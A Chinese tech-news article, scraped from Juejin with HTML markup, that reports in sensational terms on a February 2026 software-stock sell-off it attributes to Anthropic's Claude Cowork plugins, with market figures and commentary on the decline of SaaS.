<p><em>Elastic、Elasticsearch 及相关商标是 Elasticsearch B.V. 在美国及其他国家的商标、徽标或注册商标。所有其他公司和产品名称均为其各自所有者的商标、徽标或注册商标。</em></p>
<p>原文：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fsearch-labs%2Fblog%2Felastic-workflows-automation" title="https://www.elastic.co/search-labs/blog/elastic-workflows-automation" target="_blank" ref="nofollow noopener noreferrer">www.elastic.co/search-labs…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[万亿市值一夜蒸发！Claude Cowork 血洗全球软件业，老黄急了]]></title>    <link>https://juejin.cn/post/7603054272158957618</link>    <guid>https://juejin.cn/post/7603054272158957618</guid>    <pubDate>2026-02-05T10:15:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603054272158957618" data-draft-id="7602982045138812974" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="万亿市值一夜蒸发！Claude Cowork 血洗全球软件业，老黄急了"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-02-05T10:15:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="新智元"/> <meta itemprop="url" content="https://juejin.cn/user/952600743642312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            万亿市值一夜蒸发！Claude Cowork 血洗全球软件业，老黄急了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/952600743642312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    新智元
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:15:32.000Z" title="Thu Feb 05 2026 10:15:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/55060c6c2ef2420ba81bc9c124404dd6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=f2UF9bxzy1BXPUsqNwk2KDfEAGQ%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-0"><strong>「【新智元导读】又崩了！硅谷软件巨头短短一夜，蒸发 3000 亿美金，过去一周全球近万亿美金没了。令人想不到的是，罪魁祸首竟是 Anthropic 推出的一款插件。」</strong></h5>
<p>瞳孔地震！一夜之间，全球软件股集体跳水，蒸发 3000 亿美金。</p>
<p>如今，整个硅谷都在说：软件（SaaS）已死！</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3058e81f3d2c4df5987e81cc15e862fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=FglTggl19Ciq%2FjIJlwX68DCe4zg%3D" alt="" loading="lazy"/></p>
<p>起因竟是，Anthropic 为 Claude Cowork 植入「插件」（plugins）功能。仅凭一己之力，凌迟老牌巨头公司。</p>
<p>注意！这还不是「新模型」，仅是 11 款「新插件」。</p>
<p>它们直接统领了财务、销售、法律各行各业，不用嵌套在软件中运行，AI 直接把软件取而代之。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8a9f850114e469c9182d9a08e152533~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=7EA0CRpuiIvvBtv5J8Vcsikhpf8%3D" alt="" loading="lazy"/></p>
<p>这是破天荒第一次，一家做底层模型的 AI 公司，把「应用层」直接端掉，并接管整条业务工作流。</p>
<p>现如今，整个华尔街陷入恐慌，宣称「SaaS 末日」（SaaSpocalypse）真正来临。</p>
<p>摩根大通发文称：Anthropic 正在吞噬整个世界，让 Saas 商业模式崩塌，且无处可藏！</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67dee5ed40514b169e83666f9207dfc0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=i5YCrm9xAsYxoWNlw97Pf80jkI4%3D" alt="" loading="lazy"/></p>
<p>美股方面，周三开盘不久后，甲骨文重挫 4.2%。</p>
<p>随之，其他软件巨头也纷纷走低：Adobe 下跌 2.6%，Salesforce 跌 3.3%，Atlassian 跌 3%......</p>
<p>仅在当地时间周二交易中，短短 24 小时，软件、法律科技、数据服务公司市值蒸发了约 2850-3000 亿美元。</p>
<p>路透称，自 1 月 28 以来，软件和服务的股价蒸发近 8300 亿美元。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff68a04892374caf85d6f25ca68607c4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=xzdtVe6TdFzC3ycex5%2Fimx0sGas%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18767f1acfa84c24986c2277ae08a6b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=%2FYpXtOm1GRQfCP68r8q6MHodUl8%3D" alt="" loading="lazy"/></p>
<p>令人细思极恐的是，这还仅是 11 款插件「研究预览版」而已，就把 AI 自动化根基，扎到各行各业。</p>
<p>不得不说，活在这个时代真是疯狂！</p>
<p>一位大佬锐评，「市场终于从冰冷数学逻辑中惊醒：如果模型能直接交付成果，传统的软件外壳将毫无价值」。</p>
<p>模型即员工，软件即泡沫，Anthropic 的转身宣告了一个时代的终结。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81b2cc63732f4b8fb24002c5867343e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=bPlRfZvKlvyCMH44jh9gpbdvOkQ%3D" alt="" loading="lazy"/></p>
<p>还有很多人表示，这只是历史的插曲，未来不可想象。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/89c8c6c561cd49e58c66c2c26e8133e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=Pp4Y1nB9Kv%2F3VeD1%2FrsXKsAq1aY%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f70bf60f7b254afcbec3e65bcbafde8f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=ZYRTlDXH3iKprTYh8DfK%2F5%2FSRCc%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dcaec949ea374d07834e8e212a48e374~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=K57PyPQCScyoHCkAgu8kUcjxHkY%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fdff999cd7794ad7a2dbf074f5901131~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=NK1OknuUK6Wepy79LGUXdNhD2rE%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3506d5e6f5214ef796d29e9cb027382f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=x3fr5g%2FaSVFvo9ul6VCt4eQSD7U%3D" alt="" loading="lazy"/></p>
<p>上下滑动查看</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/342a0018d7c6475e81d359e2679f451c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=gXw6Mwolc1j2l0dYygJhQWCk2W0%3D" alt="" loading="lazy"/></p>
<p><strong>「Claude 插件接管一切」</strong></p>
<p><strong>「软件时代已死」</strong></p>
<p>话又说回来，Anthropic 发布的 Cowork「插件」有何魔力，竟引发全球软件股票的恐慌？</p>
<p>这一切，还得回到 1 月 29 日，一场没有掀起什么大浪的「小更新」。</p>
<p>Claude Cowork 这款生产力办公神器，自诞生之后一夜成为当红炸子鸡，各家公司都在纷纷效仿。</p>
<p>上周末，Cowork 终于迎来了史诗级更新：新增 11 款插件。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d119230d381240e0b33e7872d6b5c90f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=HWUvHkiBrePAhE0taS%2FsAYYm%2BFc%3D" alt="" loading="lazy"/></p>
<p>可别小看这个小更新，11 款插件一口气覆盖了销售、财务、法律、数据、市场营销等多个领域。</p>
<p>在官网介绍中，Anthropic 是这么描述其能力的：</p>
<p>你可以将各种技能、连接器、斜杠命令和子智能体（sub-agents）整合在一起，让 Claude 变身为精通岗位、团队和公司业务的「特种兵」。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c34a3b1e1d384650a9a88429add647b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=C2BP974Zo8hOwcUc2ex0mYQv2QE%3D" alt="" loading="lazy"/></p>
<p>以「销售插件」为例：它可以将 Claude 接入个人 CRM 和知识库，学习销售流程。</p>
<p>从此，从调研潜在客户到会后跟进，人类都能通过指令轻松完成。插件配置只需「一次性」搞定，之后每当涉及相关任务，Claude 都会自动调用背景信息。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/49658bfc83294cb0974a50bee600d083~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=e%2FiNL5a29R5Pu%2B6xoNJkpFkroLs%3D" alt="" loading="lazy"/></p>
<p>众所周知，Claude Cowork 是「非代码版的 Claude Code」。</p>
<p>实际上，Claude Code 也是软件巨头市值惨跌的「罪魁祸首」之一。其强大的编程能力，搅动甚至颠覆了编码底层逻辑。</p>
<p>它们的出现，释放了一个强烈的信号，大模型正在杀入所谓的「应用层」。</p>
<p>市场分析认为，Anthropic 策略已发生转变：单纯提供 API（工具）→「即插即用」工作流。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b364b10ebc7f4d63a23c4cbee0244533~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=YvdtJQlFwA%2FLN7vyblUTD106rfo%3D" alt="" loading="lazy"/></p>
<p>当 Claude Cowork 能自主读取 / 组织文件，并完成端到端法律合同审查，它就不再是 SaaS 软件的「助手」，真正进化为 SaaS 的「替代者」。</p>
<p>因此，全球软件行业正经历一场极其惨烈的「信仰地震」！</p>
<p><strong>「<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c2f9d6293dc248a582ba579bb0dd602c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=SjVCbeHO9odQ5pkNkWbRq%2FauQkM%3D" alt="" loading="lazy"/>」</strong></p>
<p><strong>「硅谷「信仰」崩塌，LLM 杀入了应用层」</strong></p>
<p>实际上，美股软件暴跌「非一日之寒」，从去年开始就已经有了一系列迹象。</p>
<p>只不过，Anthropic 这次更新，成为了最大「导火索」，直接在传统软件赖以生存的领地插旗。</p>
<p>这种降维打击，让投资者想起了当年的亚马逊——从卖书起家，最终颠覆了零售、云服务和物流等多个行业。</p>
<p>统计显示，过去一个月，标普北美软件指数下跌了 18%，跌至 2025 年 4 月以来最低水平。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae728132b37a4caf8b4be7449dde6774~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=l6URoYqLvfH5YWYU6cKq3cMEk3g%3D" alt="" loading="lazy"/></p>
<p>短短 5 个交易日内，标普 500 软件服务指数暴跌近 13%，市值缩水之快，甚至让刚刚创下历史新高的标普 500 大盘都黯然失色。</p>
<p>这场风暴不仅席卷了华尔街，也波及了亚洲、欧洲。就连英伟达 CEO 老黄紧急发声：</p>
<p>有这样一种观点认为，软件行业的工具正在衰落，并将被 AI 取代……</p>
<p>这是世界上最不合逻辑的事情，时间会证明一切。</p>
<p>确实，时间会证明一切。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02f7dba6f36f46e8805219332648c4a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=v9C%2BDy5MidqLm6nRN8TMpy7BnhA%3D" alt="" loading="lazy"/></p>
<p><strong>「短短一周，上万亿美金没了」</strong></p>
<p>想象一下，你是某家财富 500 强公司的法务总监。</p>
<p>周一早上 7 点，你打开邮箱，本该是焦虑的一天——上周遗留的千页并购合同还等着人工审计，涉及上百个非标条款、续约日期、交叉违约条件。</p>
<p>但今时不同以往。</p>
<p>Claude Cowork 的法律 Agent 插件已经连夜登录了你们的法律数据库，自主完成了实体关系映射，提取了所有关键日期，识别出三处潜在风险条款，并生成了完整的合规报告，连 PDF 都自动排版好了。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c8beb4c175a54cba9ab2a98d2a5d53b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=EiFml91eetcEqxb1eNLsjGW1et8%3D" alt="" loading="lazy"/></p>
<p>你盯着屏幕，咖啡凉了也没察觉：它不需要你点任何按钮，它直接「做了」。</p>
<p>这不是科幻。这是 2026 年 2 月 3 日的现实。</p>
<p>对于法律科技行业来说，这虽然不是 1929 年的「大萧条」，但情况也绝对不妙。</p>
<p>· 汤森路透市值蒸发了约 15%。</p>
<p>· 律商联讯的母公司下跌了约 14%。</p>
<p>· 电子签名冠军 DocuSign 跌了 11%。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a660888bb7c14be18d5e7709f0f25a6a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=4Qh%2F2AxNeWHXjXAOJycy4gQEvIc%3D" alt="" loading="lazy"/></p>
<p>一年来，法律科技公司一直在炒作智能体 AI 是未来，但没有拿出太多实质成果。</p>
<p>现在，一家基础模型公司发布了一款智能体法律工具，市场突然意识到，法律 AI「大众化」可能将法律科技的客户群「大众化」到消失的地步。</p>
<p>这直接引爆了美股软件股集体下跌——</p>
<p>Gartner 暴跌 21%，Thomson Reuters 跌 18%，ServiceNow 跌 11%，Salesforce 一度熔断。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ee5ea0f325a04c5aaf2f110f394c1526~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=uGrSP68SsmPbcB3CmuZH3iIVj%2BE%3D" alt="" loading="lazy"/></p>
<p>纳指 100 两天跌掉 5500 亿美元市值，是去年 10 月以来的最惨纪录。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1fa7df599d9a41bb9d28b4911ff94397~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=TwtPy7Q1SyNQEP2RFaRI4Sif0As%3D" alt="" loading="lazy"/></p>
<p>这波「软件股大屠杀」从 2 月 3 日开始，一路蔓延到 2 月 4 日，交易员们已经给它起了个新名字：「SaaSpocalypse」——SaaS 世界末日。</p>
<p>而且这种抛售潮扩大到了更大的市场。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea2b9e3a975341fdb12597e06c8ad016~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=YMZToPWsArPI0D8y3Q7yO0VFFSg%3D" alt="" loading="lazy"/></p>
<p>由于市场担忧私募信贷股票对「受 AI 冲击的软件公司的风险敞口」，相关个股大幅下跌。</p>
<p>Blue Owl、TPG、Ares Management 和 KKR 均下跌超 10%。Apollo 下跌 7%，贝莱德（BlackRock）下跌 5%。</p>
<p>iShares 软件 ETF 今年已下跌 20%，创三年最大单日跌幅。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/05cd449838654ee6a8ad171758e270cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=5jlDC18g68GyFGtIXkVZTD%2B3T%2BU%3D" alt="" loading="lazy"/></p>
<p>整个软件板块像被抽走了氧气。</p>
<p><strong>「市场恐慌情绪，在全球蔓延。」</strong></p>
<p>欧洲广告巨头 WPP、Omnicom、Publicis 集体下挫 10% 以上，欧洲股市蒸发了 3000 亿美元。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23eb97a50dbb4629847952761f882898~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=CZJpNZNhlapoV882NlN6xbpxoew%3D" alt="" loading="lazy"/></p>
<p>英国原本被视为 AI 赢家的 Relx（拥有 LexisNexis）重挫 14.4%，伦敦证交所集团（LSEG）下跌 12.8%，创五年最差单日表现。广告巨头 WPP 和 Omnicom 也因担心营销工作被自动化而大跌。</p>
<p>印度 IT 巨头如 TCS、Infosys 正面临 3000 亿美元营收风险 ，一天蒸发 19.1 万亿卢布，约 2010 亿美元。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e95b08c9b1e4c23a584afdcd163e2cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=pORyFRyOFU7SgoV8Y24fBYeFtkA%3D" alt="" loading="lazy"/></p>
<p>劳动力成本套利似乎正在消失，160 万印度 IT 从业者受影响，而 Anthropic 仅有 2500 名员工。</p>
<p>现在市场还有谁在谈 AI 泡沫？</p>
<p><strong>「Anthropic 这只」</strong> <strong>「AI」</strong> <strong>「蝴蝶扇了一下翅膀，全球股市狂风暴雨、令人胆寒──」</strong></p>
<p>它这次没有卖模型，卖的是「IT 行业的死亡判决书」。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/33443d8acab04292b44ccbfe2014cd54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=ni%2BgzLVJl6sT1gKNbYGcZ%2Fr1jbs%3D" alt="" loading="lazy"/></p>
<p><strong>「全球 SaaS 浩劫，都是 AI 干的」</strong></p>
<p>微软、Salesforce、Adobe，个个是 SaaS 翘楚。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f9f8f012a03c491eb1d810183b5fe261~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891332&amp;x-signature=tzR9YYLDsPx4%2BHGq1WqtlYJO%2F%2Fs%3D" alt="" loading="lazy"/></p>
<p>2023 年全球光在云端 SaaS 上的花销就超过了 4000 亿美元。但现在，这套模式正面临生成式 AI 的猛烈冲击。</p>
<p>警告其实早就有了：AI 工具，尤其是那些能自动执行任务的 AI 智能体，可能会让很多 SaaS 软件变得「没必要」。</p>
<p>而 Anthropic 发布的 Cowork 插件，是压垮骆驼的最后一根稻草。</p>
<p>传统 SaaS 的护城河建立在三个支柱上：</p>
<ol>
<li>按席位（Per-Seat）收费——人越多，钱越多；</li>
<li>用户必须适配复杂的 UI/UX；</li>
<li>功能越全、越封闭，壁垒越高。</li>
</ol>
<p>但 Claude Cowork 把这一切都踩碎了。现在是 AaaS（Agent as a Service）的时代：</p>
<ul>
<li>收费模式 → 按产出（Per-Outcome）计费；</li>
<li>交互逻辑 → 零 UI，AI 在后台直接操作；</li>
<li>系统价值 → 接口越开放，存活概率越高。</li>
</ul>
<p>毁灭的逻辑极其简单：</p>
<p>一个 Claude 智能体，能干掉 10 个初级会计或法务助理的工作量。</p>
<p>一家公司原本需要购买 100 个 Salesforce 或 Zendesk 席位，现在只需要 10 个 Claude 就够了。</p>
